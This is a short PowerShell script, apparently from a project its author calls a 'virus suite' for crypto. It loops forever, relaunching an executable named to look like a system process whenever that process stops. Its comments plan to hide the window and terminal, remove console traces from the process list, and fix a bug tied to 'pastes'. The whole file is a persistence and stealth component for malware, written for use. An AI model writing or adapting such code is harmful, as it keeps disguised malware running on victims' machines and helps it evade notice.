
##TODO BEFORE RUNNING SCRIPT
#Start powershell with "Run as administrator"
#Set-ExecutionPolicy RemoteSigned --Unlock
#Set-ExecutionPolicy Restricted --Lock


##########

$exe = "C:\Users\Hamerton Mathieu\C# Projects\src\main\c#\virus suite\crypto\app\sys_host_dl_v4.0.30319_69"

$proc = "sys_host_dl_v4.0.30319_69"
$cmd = "Start-Process -FilePath '" + $exe + ".exe'"   # "-WindowStyle Hidden" #for daemon properties
while($true){
	try{
		Get-Process -Name $proc -ErrorAction Stop
	}

	catch{
		#throwing exception => process isn't running
		Invoke-Expression $cmd
	}
}
##########


#TODO: After a certain number of pastes, the program stops and is kicked off by powershell... Not a big deal but look into this bug (check on getData)
#TODO: silence the powershell terminal
#TODO: console log of virus is still showing up as a process. Removed headless console from process list (preferably by removing Console print statements)
#TODO: get exe and proc to be generalized